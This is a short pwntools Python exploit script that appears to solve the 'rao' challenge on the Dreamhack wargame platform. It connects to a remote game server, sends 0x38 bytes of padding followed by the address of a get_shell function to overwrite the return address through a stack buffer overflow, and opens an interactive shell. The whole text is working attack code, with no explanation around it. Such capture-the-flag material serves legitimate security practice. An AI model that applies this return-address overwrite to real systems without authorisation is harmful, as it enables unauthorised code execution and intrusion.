from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/rao')
else:
    r = remote('host2.dreamhack.games', 24292)

get_shell = 0x4006aa # get_shell()

r.sendlineafter('Input: ', b'a' * 0x38 + p64(get_shell))

r.interactive()